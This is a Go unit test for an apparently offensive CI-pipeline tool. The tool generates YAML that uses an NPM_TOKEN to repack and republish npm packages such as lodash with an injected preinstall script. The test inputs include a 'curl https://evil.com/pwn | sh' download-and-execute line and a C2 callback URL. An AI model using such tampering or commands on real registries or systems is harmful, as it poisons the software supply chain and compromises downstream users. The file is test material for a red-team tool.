//go:build !e2e

package payloads

import (
	"strings"
	"testing"
)

func TestGenerateNpmTamperYAML(t *testing.T) {
	tests := []struct {
		name     string
		opts     NpmTamperOptions
		contains []string
	}{
		{
			name: "default_options",
			opts: NpmTamperOptions{},
			contains: []string{
				"NPM_TOKEN", "npm pack", "npm publish", "preinstall",
				"registry.npmjs.org", "script:", "npm-tamper:",
				"No npm publishing token found", "tampered-package.json",
			},
		},
		{
			name: "custom_registry",
			opts: NpmTamperOptions{
				RegistryURL: "https://npm.internal.corp",
			},
			contains: []string{
				"npm.internal.corp", "NPM_TOKEN", "npm publish",
			},
		},
		{
			name: "custom_package",
			opts: NpmTamperOptions{
				PackageName: "lodash",
			},
			contains: []string{
				"lodash", "npm pack", "npm publish",
			},
		},
		{
			name: "custom_inject_script",
			opts: NpmTamperOptions{
				InjectedScript: "curl https://evil.com/pwn | sh",
			},
			contains: []string{
				"curl https://evil.com/pwn", "preinstall",
			},
		},
		{
			name: "with_callback",
			opts: NpmTamperOptions{
				CallbackURL: "https://c2.example.com/report",
			},
			contains: []string{
				"https://c2.example.com/report", "npm_tamper",
			},
		},
		{
			name: "with_tags_and_manual",
			opts: NpmTamperOptions{
				Common: CommonOptions{
					Tags:   []string{"docker"},
					Manual: true,
				},
			},
			contains: []string{
				"docker", "when: manual",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			y := GenerateNpmTamperYAML(tt.opts)
			_ = mustParse(t, y)
			for _, want := range tt.contains {
				if !strings.Contains(y, want) {
					t.Errorf("expected %q in output:\n%s", want, y)
				}
			}
		})
	}
}
